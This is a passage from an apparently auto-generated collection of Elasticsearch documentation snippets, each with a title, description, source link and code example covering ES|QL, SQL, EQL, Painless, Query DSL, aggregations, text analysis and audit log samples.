\"b\": [1, 1] }\n\nPOST /_query\n{\n  \"query\": \"FROM mv | EVAL b=TO_STRING(b) | LIMIT 2\"\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"took\": 28,\n  \"is_partial\": false,\n  \"columns\": [\n    { \"name\": \"a\", \"type\": \"long\"},\n    { \"name\": \"b\", \"type\": \"keyword\"}\n  ],\n  \"values\": [\n    [1, [\"1\", \"2\", \"2\"]],\n    [2,      [\"1\", \"1\"]]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing ASCII Folding Filter with preserve_original Parameter in Elasticsearch\nDESCRIPTION: Example of creating a custom ASCII folding filter with the preserve_original parameter set to true. This configuration emits both the original tokens and the folded tokens, providing more flexible text analysis options.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-asciifolding-tokenfilter.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT /asciifold_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"standard_asciifolding\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"my_ascii_folding\" ]\n        }\n      },\n      \"filter\": {\n        \"my_ascii_folding\": {\n          \"type\": \"asciifolding\",\n          \"preserve_original\": true\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: SQL SHOW COLUMNS Syntax\nDESCRIPTION: The syntax definition for the SHOW COLUMNS command in Elasticsearch SQL. Supports optional catalog identifier, frozen indices inclusion, and pattern matching for table names.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-show-columns.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSHOW COLUMNS\n    [CATALOG identifier]? <1>\n    [INCLUDE FROZEN]?     <2>\n    [FROM | IN]\n    [table_identifier |   <3>\n     LIKE pattern]        <4>\n```\n\n----------------------------------------\n\nTITLE: Converting String to Uppercase using TO_UPPER in ESQL\nDESCRIPTION: This snippet demonstrates how to use the TO_UPPER function in ESQL to convert a string to uppercase. It creates a row with a 'message' field and then uses EVAL to create a new field 'message_upper' with the uppercase version of the message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_upper.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW message = \"Some Text\"\n| EVAL message_upper = TO_UPPER(message)\n```\n\n----------------------------------------\n\nTITLE: Executing Span Not Query in Elasticsearch\nDESCRIPTION: Demonstrates a span not query that filters documents containing 'hoya' while excluding those with 'la' preceding 'hoya'\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-span-not-query.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"span_not\": {\n      \"include\": {\n        \"span_term\": { \"field1\": \"hoya\" }\n      },\n      \"exclude\": {\n        \"span_near\": {\n          \"clauses\": [\n            { \"span_term\": { \"field1\": \"la\" } },\n            { \"span_term\": { \"field1\": \"hoya\" } }\n          ],\n          \"slop\": 0,\n          \"in_order\": true\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: SCORE Function Syntax in Elasticsearch SQL\nDESCRIPTION: The SCORE function returns the relevance score of matched documents, with higher values indicating better matches.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-search.md#2025-04-21_snippet_8\n\nLANGUAGE: sql\nCODE:\n```\nSCORE()\n```\n\n----------------------------------------\n\nTITLE: String Bit Length Function Documentation\nDESCRIPTION: Documentation block explaining a function that calculates the bit length of UTF-8 strings. Notes that UTF-8 encoding means a single character may occupy multiple bytes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/bit_length.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nReturns the bit length of a string.\n\n::::{note}\nAll strings are in UTF-8, so a single character can use multiple bytes.\n::::\n```\n\n----------------------------------------\n\nTITLE: Handling Empty Positions with Shingle Filter in Elasticsearch\nDESCRIPTION: This example demonstrates how to use the filler_token parameter to handle empty positions created by other filters like the stop filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-shingle-tokenfilter.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"whitespace\",\n  \"filter\": [\n    {\n      \"type\": \"stop\",\n      \"stopwords\": [ \"a\" ]\n    },\n    {\n      \"type\": \"shingle\",\n      \"filler_token\": \"+\"\n    }\n  ],\n  \"text\": \"fox jumps a lazy dog\"\n}\n```\n\n----------------------------------------\n\nTITLE: Using _prefer_nodes Preference Parameter in Elasticsearch\nDESCRIPTION: Shows the _prefer_nodes preference parameter which prefers specific nodes identified by their node IDs for handling search operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/licenses/slf4j-api-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\npreference=_prefer_nodes:abc,xyz\n```\n\n----------------------------------------\n\nTITLE: Division Operator in Painless\nDESCRIPTION: Demonstrates the division operator ('/') in Painless using different numeric types.  Integer division truncates the decimal portion of the result. The example shows division between int and double types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_16\n\nLANGUAGE: painless\nCODE:\n```\nint i = 29/4;     <1>\ndouble d = i/7.0; <2>\n```\n\n----------------------------------------\n\nTITLE: kNN Search Profile Result in Elasticsearch (JavaScript)\nDESCRIPTION: Shows a portion of the kNN search profile output from Elasticsearch, including timing breakdowns for vector operations, query execution, and result collection.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-profile.md#2025-04-21_snippet_17\n\nLANGUAGE: js\nCODE:\n```\n\"dfs\" : {\n    \"knn\" : [\n        {\n        \"vector_operations_count\" : 4,\n        \"query\" : [\n            {\n                \"type\" : \"DocAndScoreQuery\",\n                \"description\" : \"DocAndScoreQuery[0,...][0.008961825,...],0.008961825\",\n                \"time_in_nanos\" : 444414,\n                \"breakdown\" : {\n                  \"set_min_competitive_score_count\" : 0,\n                  \"match_count\" : 0,\n                  \"shallow_advance_count\" : 0,\n                  \"set_min_competitive_score\" : 0,\n                  \"next_doc\" : 1688,\n                  \"match\" : 0,\n                  \"next_doc_count\" : 3,\n                  \"score_count\" : 3,\n                  \"compute_max_score_count\" : 0,\n                  \"compute_max_score\" : 0,\n                  \"advance\" : 4153,\n                  \"advance_count\" : 1,\n                  \"score\" : 2099,\n                  \"build_scorer_count\" : 2,\n                  \"create_weight\" : 128879,\n                  \"shallow_advance\" : 0,\n                  \"create_weight_count\" : 1,\n                  \"build_scorer\" : 307595,\n                  \"count_weight\": 0,\n                  \"count_weight_count\": 0\n                }\n            }\n        ],\n        \"rewrite_time\" : 1275732,\n        \"collector\" : [\n            {\n                \"name\" : \"SimpleTopScoreDocCollector\",\n                \"reason\" : \"search_top_hits\",\n                \"time_in_nanos\" : 17163\n            }\n        ]\n    }   ]\n}\n```\n\n----------------------------------------\n\nTITLE: Multiply Operation Examples in EQL\nDESCRIPTION: Examples of using the multiply function with various numeric inputs, including decimals, negative numbers, and process variables.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-function-ref.md#2025-04-21_snippet_9\n\nLANGUAGE: eql\nCODE:\n```\nmultiply(2, 2)                                           // returns 4\nmultiply(0.5, 2)                                         // returns 1\nmultiply(0.25, 2)                                        // returns 0.5\nmultiply(-2, 2)                                          // returns -4\nmultiply(-2, -2)                                         // returns 4\n\n// process.args_count = 2\nmultiply(process.args_count, 2)                          // returns 4\nmultiply(0.5, process.args_count)                        // returns 1\nmultiply(0.25, process.args_count)                       // returns 0.5\n\n// process.parent.args_count = 3\nmultiply(process.args_count, process.parent.args_count)  // returns 6\n\n// null handling\nmultiply(null, 2)                                        // returns null\nmultiply(2, null)                                        // returns null\n```\n\n----------------------------------------\n\nTITLE: Escaping Field Names in EQL\nDESCRIPTION: Demonstrates how to escape field names that contain hyphens, spaces, or start with numerals using backticks, and how to escape backticks within field names.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_4\n\nLANGUAGE: eql\nCODE:\n```\n`my-field`\n`my field`\n`6myfield`\n```\n\nLANGUAGE: eql\nCODE:\n```\nmy`field -> `my``field`\n```\n\n----------------------------------------\n\nTITLE: Configuring HTML Table Elements Group in Elasticsearch YAML\nDESCRIPTION: Includes all table-related HTML elements like table, th, tr, td, caption, col, colgroup, thead, tbody, and tfoot in the sanitization configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_25\n\nLANGUAGE: yaml\nCODE:\n```\n_tables\n```\n\n----------------------------------------\n\nTITLE: Using ATAN Function in Elasticsearch SQL\nDESCRIPTION: Returns the arctangent (inverse tangent) of the input numeric expression as an angle in radians. The function takes a numeric input and returns a double value. If null is provided, it returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_39\n\nLANGUAGE: sql\nCODE:\n```\nATAN(numeric_exp) <1>\n```\n\n----------------------------------------\n\nTITLE: Configuring Transport Authentication with Realm in Elasticsearch\nDESCRIPTION: YAML configuration for transport layer authentication with a specific realm. This example sets up PKI authentication for node-to-node communication using a specified PKI realm.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/watcher/licenses/failureaccess-NOTICE.txt#2025-04-21_snippet_12\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.transport.authentication.type: pki\nxpack.security.transport.authentication.realm: pki1\n```\n\n----------------------------------------\n\nTITLE: Defining ClassNotFoundException in Java\nDESCRIPTION: This snippet defines the java.lang.ClassNotFoundException class, thrown when an application tries to load in a class through its string name using `forName` but no definition for the class with the specified name could be found. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_30\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.ClassNotFoundException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Using the DIVIDE Operator in ESQL\nDESCRIPTION: The DIVIDE (/) operator divides one number by another. It returns null for multivalued fields. Integer division rounds towards 0. For floating-point division, cast one argument to DOUBLE.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/operators/div.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n### DIVIDE `/`\nDivide one number by another. If either field is [multivalued](https://www.elastic.co/docs/reference/query-languages/esql/esql-multivalued-fields) then the result is `null`.\n\nNote: Division of two integer types will yield an integer result, rounding towards 0. If you need floating point division, [`Cast (::)`](https://www.elastic.co/docs/reference/query-languages/esql/functions-operators/operators#esql-cast-operator) one of the arguments to a `DOUBLE`.\n```\n\n----------------------------------------\n\nTITLE: Creating StatsSummary Class for Statistical Calculations in Java\nDESCRIPTION: This snippet defines the StatsSummary class, which provides methods to extract statistical metrics (minimum, maximum, average, sum, and count) from a set of scores. It is essential for analyzing score distributions within scoring contexts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.score.txt#2025-04-21_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\nclass org.elasticsearch.script.StatsSummary {\n    double getMin()\n    double getMax()\n    double getAverage()\n    double getSum()\n    long getCount()\n}\n```\n\n----------------------------------------\n\nTITLE: Using IN Function with Mixed Values in ESQL\nDESCRIPTION: This snippet demonstrates the usage of the IN function in ESQL. It creates a row with three columns and applies a WHERE clause using the IN function. The IN function checks if the expression c-a is equal to any of the values in the list, which includes both literal values and a column reference.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/examples/in.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = 1, b = 4, c = 3\n| WHERE c-a IN (3, b / 2, a)\n```\n\n----------------------------------------\n\nTITLE: Incorrect MongoDB Aggregation Pipeline Example\nDESCRIPTION: This code snippet demonstrates an incorrect usage of `new Date()` within a MongoDB aggregation pipeline.  The `new Date()` expression will be treated as a string literal instead of being evaluated, leading to unexpected results. Avoid using JavaScript expressions directly within the pipeline definition.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-mongodb.md#2025-04-21_snippet_2\n\nLANGUAGE: js\nCODE:\n```\n{\n    \"aggregate\": {\n        \"pipeline\": [\n            {\n                \"$match\": {\n                  \"expiresAt\": {\n                    \"$gte\": \"new Date()\"\n                  }\n                }\n            }\n        ]\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Comparing Identity Using '!==': Painless Example\nDESCRIPTION: This snippet demonstrates the identity not equals operator to compare two values in Painless. It's used to determine if two reference types refer to different instances. Typical inputs are reference types, and the output is a boolean indicating inequality.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_26\n\nLANGUAGE: Painless\nCODE:\n```\nList a = new ArrayList();\nList b = new ArrayList();\nList c = a;\nboolean c = a !== b;\nc = a !== c;\n```\n\n----------------------------------------\n\nTITLE: Geo-distance query with lat/lon as WKT string in Elasticsearch\nDESCRIPTION: This snippet demonstrates the use of the `geo_distance` filter with latitude and longitude specified as a Well-Known Text (WKT) string within the `pin.location` field. The query searches for documents within a 12km radius of the specified coordinates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-distance-query.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nGET /my_locations/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_distance\": {\n          \"distance\": \"12km\",\n          \"pin.location\": \"POINT (-70 40)\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Selecting Specific Buckets in buckets_path\nDESCRIPTION: Example demonstrating how to select specific bucket keys from a multi-bucket aggregation using the bucket_script aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/pipeline.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /_search\n{\n  \"aggs\": {\n    \"sales_per_month\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"sale_type\": {\n          \"terms\": {\n            \"field\": \"type\"\n          },\n          \"aggs\": {\n            \"sales\": {\n              \"sum\": {\n                \"field\": \"price\"\n              }\n            }\n          }\n        },\n        \"hat_vs_bag_ratio\": {\n          \"bucket_script\": {\n            \"buckets_path\": {\n              \"hats\": \"sale_type['hat']>sales\",   <1>\n              \"bags\": \"sale_type['bag']>sales\"    <1>\n            },\n            \"script\": \"params.hats / params.bags\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: DATETIME_FORMAT Example: Format DateTime\nDESCRIPTION: Illustrates formatting a datetime using DATETIME_FORMAT with a detailed pattern. This example shows how to format a datetime including milliseconds.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_44\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DATETIME_FORMAT(CAST('2020-04-05T11:22:33.987654' AS DATETIME), 'dd/MM/yyyy HH:mm:ss.SS') AS \\\"datetime\\\";\\n\\n      datetime\n------------------\n05/04/2020 11:22:33.98\"\n```\n\n----------------------------------------\n\nTITLE: Executing Top Hits Aggregation with Nested Aggregation in Elasticsearch\nDESCRIPTION: This snippet demonstrates a search query that uses a nested aggregation on the 'comments' field, followed by a terms aggregation on 'comments.username', and finally a top_hits aggregation to retrieve nested hits.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-top-hits-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"query\": {\n    \"term\": { \"tags\": \"car\" }\n  },\n  \"aggs\": {\n    \"by_sale\": {\n      \"nested\": {\n        \"path\": \"comments\"\n      },\n      \"aggs\": {\n        \"by_user\": {\n          \"terms\": {\n            \"field\": \"comments.username\",\n            \"size\": 1\n          },\n          \"aggs\": {\n            \"by_nested\": {\n              \"top_hits\": {}\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Histogram Aggregation Result on Histogram Field in Elasticsearch\nDESCRIPTION: This snippet shows the expected output of running a histogram aggregation on a histogram field. The result includes buckets with keys representing intervals and doc_count representing the sum of counts for each interval.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-histogram-aggregation.md#2025-04-21_snippet_9\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"latency_buckets\": {\n      \"buckets\": [\n        {\n          \"key\": 0.0,\n          \"doc_count\": 18\n        },\n        {\n          \"key\": 5.0,\n          \"doc_count\": 48\n        },\n        {\n          \"key\": 10.0,\n          \"doc_count\": 25\n        },\n        {\n          \"key\": 15.0,\n          \"doc_count\": 6\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Concatenation Function in Elasticsearch Script\nDESCRIPTION: Utilizes script-based concatenation to merge `process_name` with fixed strings and checks if the result matches 'net.exe::foo::1'. Implements the `concat` method within a scripting context.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_15\n\nLANGUAGE: Elasticsearch Painless\nCODE:\n```\n\"script\":{\"script\":{\"source\":\"InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalQlScriptUtils.nullSafeFilter(InternalEqlScriptUtils.seq(InternalEqlScriptUtils.concat([X0,params.v1,params.v2,params.v3]),params.v4)))\" \"params\":{\"v0\":\"process_name\",\"v1\":\"::foo::\",\"v2\":null,\"v3\":1,\"v4\":\"net.exe::foo::1\"}\n```\n\n----------------------------------------\n\nTITLE: Performing Faster End-to-End Testing - Shell Command\nDESCRIPTION: This shell command is an optimized version to run end-to-end tests quickly by setting a smaller data size. It requires the 'make' utility and appropriate permissions. Key parameters include 'NAME' for the connector name and 'DATA_SIZE' flag to modify the test data size.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-azure-blob.md#2025-04-21_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nmake ftest NAME=azure_blob_storage DATA_SIZE=small\n```\n\n----------------------------------------\n\nTITLE: Indexing Bit Vectors in Elasticsearch\nDESCRIPTION: Demonstrates how to create an index with a dense vector field of type 'bit' and index documents with bit vector data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-script-score-query.md#2025-04-21_snippet_14\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-bit-vectors\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_dense_vector\": {\n        \"type\": \"dense_vector\",\n        \"index\": false,\n        \"element_type\": \"bit\",\n        \"dims\": 40\n      }\n    }\n  }\n}\n\nPUT my-index-bit-vectors/_doc/1\n{\n  \"my_dense_vector\": [8, 5, -15, 1, -7]\n}\n\nPUT my-index-bit-vectors/_doc/2\n{\n  \"my_dense_vector\": [-1, 115, -3, 4, -128]\n}\n\nPUT my-index-bit-vectors/_doc/3\n{\n  \"my_dense_vector\": [2, 18, -5, 0, -124]\n}\n\nPOST my-index-bit-vectors/_refresh\n```\n\n----------------------------------------\n\nTITLE: Using Filter Rules in Elasticsearch Intervals Query\nDESCRIPTION: Example demonstrating how to use a filter rule with an intervals query to find documents where 'hot' and 'porridge' appear within 10 positions without the word 'salty' between them.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-intervals-query.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nPOST _search\n{\n  \"query\": {\n    \"intervals\" : {\n      \"my_text\" : {\n        \"match\" : {\n          \"query\" : \"hot porridge\",\n          \"max_gaps\" : 10,\n          \"filter\" : {\n            \"not_containing\" : {\n              \"match\" : {\n                \"query\" : \"salty\"\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Query with Custom Script Fields\nDESCRIPTION: This query demonstrates how to use custom Painless scripts to compute and return the day of the week and number of actors for each document in the search results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-field-context.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"size\": 2,\n  \"query\": {\n    \"match_all\": {}\n  },\n  \"script_fields\": {\n    \"day-of-week\": {\n      \"script\": {\n        \"source\": \"doc['datetime'].value.getDayOfWeekEnum().getDisplayName(TextStyle.FULL, Locale.ENGLISH)\"\n      }\n    },\n    \"number-of-actors\": {\n      \"script\": {\n        \"source\": \"doc['actors'].size()\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Capturing Tampered Request Event in Elasticsearch\nDESCRIPTION: Example JSON audit log entry for when a request is detected as tampered, typically related to search scroll requests where the scroll ID appears to have been modified.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_19\n\nLANGUAGE: json\nCODE:\n```\n{\"type\":\"audit\", \"timestamp\":\"2019-11-27T22:00:00,947+0200\", \"node.id\": \"0RMNyghkQYCc_gVd1G6tZQ\", \"event.type\": \"rest\", \"event.action\": \"tampered_request\", \"origin.address\":\"[::1]:50543\", \"url.path\": \"/twitter/_async_search\", \"url.query\":\"pretty\", \"request.method\":\"POST\", \"request.id\":\"TqA9OisyQ8WTl1ivJUV1AA\"}\n```\n\n----------------------------------------\n\nTITLE: Filtering Process Events with Username Starting with A or B - Elasticsearch\nDESCRIPTION: This query filters events in the `process` category where the `user_name` starts with either 'A' or 'B'. Utilizes Elasticsearch's `prefix` query to identify and boost relevant records. Case-sensitive by default.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_5\n\nLANGUAGE: Elasticsearch\nCODE:\n```\n{\"bool\":{\"must\":[{\"term\":{\"event.category\":{\"value\":\"process\"}}},{\"bool\":{\"should\":[{\"prefix\":{\"user_name\":{\"value\":\"A\",\"boost\":1.0}}},{\"prefix\":{\"user_name\":{\"value\":\"B\",\"boost\":1.0}}}],\"boost\":1.0}}],\"boost\":1.0}}\n```\n\n----------------------------------------\n\nTITLE: Apache License Boilerplate Notice Template\nDESCRIPTION: Standard boilerplate notice text for applying Apache License 2.0 to software projects. Includes placeholder fields for copyright year and owner name, along with the standard license reference and conditions text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/distribution/licenses/commons-daemon-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Applying Apache License 2.0 Boilerplate Notice\nDESCRIPTION: A template for the boilerplate notice to be included when applying the Apache License 2.0 to a project. It includes placeholders for the copyright year and owner name, as well as the full license text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/licenses/joda-time-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n   Copyright [yyyy] [name of copyright owner]\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Filtering Employee Data with ESQL\nDESCRIPTION: ESQL query that selects first_name, last_name, and height columns from employees table and filters for first names less than 4 characters in length. The query demonstrates the use of KEEP for column selection and LENGTH function in WHERE clause.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/whereFunction.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP first_name, last_name, height\n| WHERE LENGTH(first_name) < 4\n```\n\n----------------------------------------\n\nTITLE: Converting WKT String to Geoshape using TO_GEOSHAPE in ESQL\nDESCRIPTION: This example demonstrates how to convert a WKT (Well-Known Text) format string representing a polygon into a geo_shape data type using the TO_GEOSHAPE function in ESQL. The query creates a row with a WKT string and transforms it into a geoshape object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_geoshape.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW wkt = \"POLYGON ((30 10, 40 40, 20 40, 10 20, 30 10))\"\n| EVAL geom = TO_GEOSHAPE(wkt)\n```\n\n----------------------------------------\n\nTITLE: Computing SHA256 Hash in ESQL\nDESCRIPTION: This snippet filters out messages containing a specific string and computes the SHA256 hash for the remaining messages. The output includes the original message and its corresponding SHA256 hash. It requires a dataset labeled 'sample_data' and uses the EVAL function to perform the hash computation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/sha256.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM sample_data\n| WHERE message != \"Connection error\"\n| EVAL sha256 = sha256(message)\n| KEEP message, sha256\n```\n\n----------------------------------------\n\nTITLE: Defining Complex Role Descriptor with Index Management and Application Privileges in Elasticsearch\nDESCRIPTION: This role descriptor includes manage_ilm privileges on specific indices, all privileges on security indices, and application-specific privileges for 'maps' with various edge cases in naming.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/src/test/resources/org/elasticsearch/xpack/security/audit/logfile/audited_roles.txt#2025-04-22_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\"cluster\":[],\"indices\":[{\"names\":[\"na\\\"me\",\"*\"],\"privileges\":[\"manage_ilm\"],\"field_security\":{\"grant\":null,\"except\":[\"denied*\"]},\"query\":\"{\\\"match\\\": {\\\"category\\\": \\\"click\\\"}}\"},{\"names\":[\"/@&~(\\\\.security.*)/\"],\"privileges\":[\"all\",\"cluster:a_wrong_*_one\"]}],\"applications\":[{\"application\":\"maps\",\"privileges\":[\"coming\",\"up\",\"with\",\"random\",\"names\",\"is\",\"hard\"],\"resources\":[\"raster:*\"]}],\"run_as\":[\"impersonated???\"]}\n```\n\n----------------------------------------\n\nTITLE: Indexing Array of Objects with Regular Object Type\nDESCRIPTION: Example showing how a document with an array of user objects is indexed using the default object type. This demonstrates the flattening behavior where the relationship between fields in the same object is lost.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/nested.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/1\n{\n  \"group\" : \"fans\",\n  \"user\" : [ \n    {\n      \"first\" : \"John\",\n      \"last\" :  \"Smith\"\n    },\n    {\n      \"first\" : \"Alice\",\n      \"last\" :  \"White\"\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Left Shift with Different Integer Types in Painless\nDESCRIPTION: This snippet illustrates the left shift operator, showing how to shift bits of different integer types. It includes type promotion rules and error handling for non-integer types during the operation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_24\n\nLANGUAGE: painless\nCODE:\n```\nint i = 4 << 1;   <1>\nlong l = i << 2L; <2>\n```\n\n----------------------------------------\n\nTITLE: Indexing Histogram Data for Avg Aggregation in Elasticsearch\nDESCRIPTION: Demonstrates how to index pre-aggregated histogram data for use with the Avg aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-avg-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT metrics_index/_doc/1\n{\n  \"network.name\" : \"net-1\",\n  \"latency_histo\" : {\n      \"values\" : [0.1, 0.2, 0.3, 0.4, 0.5],\n      \"counts\" : [3, 7, 23, 12, 6]\n   }\n}\n\nPUT metrics_index/_doc/2\n{\n  \"network.name\" : \"net-2\",\n  \"latency_histo\" : {\n      \"values\" :  [0.1, 0.2, 0.3, 0.4, 0.5],\n      \"counts\" : [8, 17, 8, 7, 